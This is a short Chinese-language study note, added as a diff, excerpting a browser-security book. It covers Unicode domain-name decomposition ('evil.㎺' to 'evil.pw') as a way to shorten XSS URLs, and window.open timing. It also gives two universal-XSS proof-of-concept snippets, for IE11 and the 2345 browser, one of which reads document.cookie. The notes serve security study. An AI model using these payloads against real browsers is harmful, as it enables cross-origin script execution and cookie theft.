@@ -1,0 +1,44 @@
+- Title: 白帽子讲浏览器安全 笔记
+- Link: http://sh3ll.me/archives/201709111506.txt
+- Published: 2017-09-11 15:06
+- Updated: 2017-09-11 15:06
+
+笔记、摘录。
+
+1. p20 自纠错与 Unicode 字符分解映射
+
+解析 http://evil.㎺/ 时，浏览器会通过将其中的 Unicode 字符按照映射分解成两个 ASCII 字符『pw』，然后重定向到『http://evil.pw』。
+利用这个技巧可以在特定场景下缩短 URL 的字长，例如 Short XSS。
+Python 中可以通过 unicodedata.decomposition 函数实现 Unicode 的分解：
+
+    In [1]: import unicodedata
+
+    In [2]: print unichr(0x33ba)
+    ㎺
+
+    In [3]: unicodedata.decomposition(unichr(0x33ba))
+    Out[3]: '<square> 0070 0057'
+
+2. p35 IE 11 并发 + UI 阻塞导致 UXSS
+
+    <iframe src="redirect.php"></iframe>
+    <iframe src="https://www.google.com/images/srpr/logo11w.png"><iframe>
+    <script>
+        top[0].eval('_=top[1];alert();_.location="javascript:alert(document.domain)"');
+    </script>
+
+3. p41 window.open 打开新窗口的过程
+
+在 Chrome、Firefox 等浏览器中，使用 window.open() 方法打开一个新窗口时，无论第一个参数（strUrl）是什么，新开的窗口中的 URL 都不会立即
+加载，直到 `window.open()` 函数返回，新开的窗口地址都一直是 `about:blank`。直到当前 **代码块** 执行完成时，窗口才会导航到指定的 URL 上。
+而在 IE 浏览器中，新窗口刚刚创建，`window.open()` 返回的 window 对象为 null，页面开始加载时，源和传入的 strUrl 的源一致。
+
+4. p42 2345 浏览器伪协议逻辑出错导致 UXSS
+
+    <script type="text/javascript">
+        function g() {
+            window.open("http://www.baidu.com", "z");
+            window.open("javascript:alert(location.href + document.cookie);", "z")
+        }
+    </script>
+    <a href="javascript:g();">CLICK ME</a>
